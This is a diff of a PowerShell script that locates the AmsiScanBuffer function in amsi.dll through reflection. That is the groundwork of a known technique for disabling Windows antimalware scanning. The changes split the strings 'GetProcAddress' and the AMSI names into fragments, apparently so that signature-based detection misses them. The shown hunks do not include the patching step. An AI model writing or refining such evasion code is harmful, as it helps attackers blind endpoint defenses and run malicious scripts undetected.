@@ -6,7 +6,7 @@ function GetAddress($m, $f) {
     }
 
     $mH = $uNM.GetMethods() | Where-Object {$_.Name -like '*Handle' -and $_.Name -like '*Module*'} | Select-Object -First 1
-    $pA = $uNM.GetMethod('GetProcAddress', [type[]]('IntPtr', 'System.String'))
+    $pA = $uNM.GetMethod('Ge' + 'tPro' + 'cAdd' + 'ress', [type[]]('IntPtr', 'System.String'))
 
     $m = $mH.Invoke($null, @($m))
     $pA.Invoke($null, @($m, $f))
@@ -21,4 +21,4 @@ function GetType($f, $dT = [Void]) {
 
 $a = "a" + "ms" + "i" + "." + "dll"
 $b =  $a.Substring(0, 1).ToUpper() + $a.Substring(1, 3) + "Sc" + "an" + "Bu" + "ff" + "er"
-$ab = GetProcAddress $a $b
+$ab = GetAddress $a $b
